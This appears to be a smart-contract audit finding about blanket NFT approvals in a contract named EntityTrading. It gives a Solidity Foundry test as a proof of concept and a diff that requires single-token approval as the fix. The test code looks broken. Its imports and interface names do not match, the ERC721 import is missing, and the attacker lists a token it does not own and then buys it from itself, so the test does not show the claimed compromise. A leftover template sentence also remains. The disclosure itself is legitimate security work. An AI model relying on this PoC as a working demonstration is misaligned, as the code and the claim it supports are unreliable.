# Vulnerability details

## Impact: 
Unauthorized access due to a compromised contract could result in significant financial loss and erosion of trust as attackers could:
1.List Any User-Owned NFT For Sale Without Consent 
2.Transfer NFTs Out Of Users Accounts
Detailed description of the impact of this finding.

## Proof of Concept:
This PoC demonstrates the vulnerability associated with granting blanket approval to the `EntityTrading` contract, which can lead to unauthorized listing and sale of NFTs if the contract is compromised

Contracts Involved: 1.EntityTrading Contract 2.ITraitForge interface
Setup:
1. Deploy your current contract that allows blanket approvals.
2. Approve All NFTs: Have a user approve all their NFTs for the contract.
3. Simulate Contract Compromise: a malicious function to list and sell all approved NFTs without user consent.

```javascript

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import { EntityTrading } from "../contracts/EntityTrading.sol";
import { TraitForge } from "../contracts/TraitForgeNft/ITraitForgeNft.sol";

contract EntityTradingTest is Test {
    EntityTrading public entityTrading;
    ITraitForgeNft public nftContract;
    address public owner = address(0x1);
    address public user = address(0x2);
    address public attacker = address(0x3);
    address payable public nukeFundAddress = payable(address(0x4));
    uint256 public tokenId = 1;
    uint256 public price = 1 ether;

    function setUp() public {
        nftContract = ITraitForgeNft(address(new MockNFT()));
        entityTrading = new EntityTrading(address(nftContract));
        entityTrading.setNukeFundAddress(nukeFundAddress);
        vm.deal(user, 10 ether);
        vm.deal(attacker, 10 ether);
        vm.deal(nukeFundAddress, 0 ether);

        // Mint an NFT to the user
        MockNFT(address(nftContract)).mint(user, tokenId);
    }

    function testBlanketApprovalExploit() public {
        // User approves all NFTs for the contract
        vm.startPrank(user);
        nftContract.setApprovalForAll(address(entityTrading), true);
        vm.stopPrank();

        // Simulate contract compromise by attacker
        vm.startPrank(attacker);
        // Attacker lists the user's NFT without their consent
        entityTrading.listNFTForSale(tokenId, price);
        // Attacker buys the NFT
        entityTrading.buyNFT{value: price}(tokenId);
        vm.stopPrank();

        // Check that the attacker now owns the NFT
        assertEq(nftContract.ownerOf(tokenId), attacker);
        // Check that the nukeFundAddress received the tax cut
        assertEq(nukeFundAddress.balance, price / entityTrading.taxCut());
    }
}

contract MockNFT is ERC721URIStorage {
    uint256 public nextTokenId;

    constructor() ERC721("MockNFT", "MNFT") {}

    function mint(address to, uint256 tokenId) public {
        _mint(to, tokenId);
    }
}


```

## Recommended Mitigation Steps: Implement Single-NFT Approvals, instead of a blanket approval
```javascript
- require(
  nftContract.getApproved(tokenId) == address(this) ||
  nftContract.isApprovedForAll(msg.sender, address(this)),
  'Contract must be approved to transfer the NFT.'
);
```
```javascript
+ require(
  nftContract.getApproved(tokenId) == address(this),
  'Contract must be approved to transfer this specific NFT.'
);
```
